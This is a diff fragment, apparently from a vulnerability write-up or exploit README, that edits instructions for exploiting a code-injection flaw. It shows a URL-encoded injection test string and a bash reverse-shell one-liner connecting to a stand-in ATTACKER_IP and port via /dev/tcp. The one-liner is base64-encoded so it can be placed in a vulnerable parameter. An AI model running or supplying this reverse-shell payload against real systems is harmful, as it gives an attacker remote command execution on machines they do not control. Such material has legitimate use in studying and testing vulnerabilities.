@@ -49,7 +49,7 @@ abc')%20%2b%20print('Code%20Execution%20possible!')%23%20
 
 To get a reverse shell, do the following:
 ```bash
-echo -n "bash -c 'bash -i >& /dev/tcp/$(ATTACKER_IP)/$(ATTACKER_PORT) 0>&1'" | base64
+echo -n "bash -i >& /dev/tcp/$(ATTACKER_IP)/$(ATTACKER_PORT) 0>&1" | base64
 ```
 Add the following payload to the vulnerable parameter:
 ```
